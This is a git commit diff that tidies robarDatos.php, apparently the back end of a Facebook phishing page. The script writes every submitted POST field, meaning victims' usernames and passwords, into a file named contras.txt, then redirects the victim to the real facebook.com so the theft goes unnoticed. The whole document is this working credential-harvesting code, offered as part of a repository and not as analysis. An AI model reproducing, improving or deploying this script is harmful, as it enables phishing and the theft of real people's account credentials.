a3871d622897f86f97512a1cd768522873b6c274
aeonmerx <103615875+aeonmerx@users.noreply.github.com>
2023-10-11 22:55:18 -0500

    Update robarDatos.php

--- robarDatos.php
+++ robarDatos.php
@@ -1,16 +1,9 @@
 <?php
-$archivo = fopen("contras.txt","a");
-fwrite($archivo, "\t\t\t\t\t\t");
-fwrite($archivo,"\r\n");
-foreach($_POST as $key=>$value){
-fwrite($archivo, "\t\t\t\t\t\t");
-fwrite($archivo, $key);
-fwrite($archivo, "=");
-fwrite($archivo,$value);
-fwrite($file,"\r\n");
+$archivo = fopen("contras.txt", "a");
+fwrite($archivo, "\r\n");
+foreach ($_POST as $key => $value) {
+    fwrite($archivo, $key . "=" . $value . "\r\n");
 }
-fwrite($archivo,"\r\n");
-fwrite($file,"\t\t\t\t\t\t");
 fclose($archivo);
 header("Location: https://www.facebook.com");
 die();
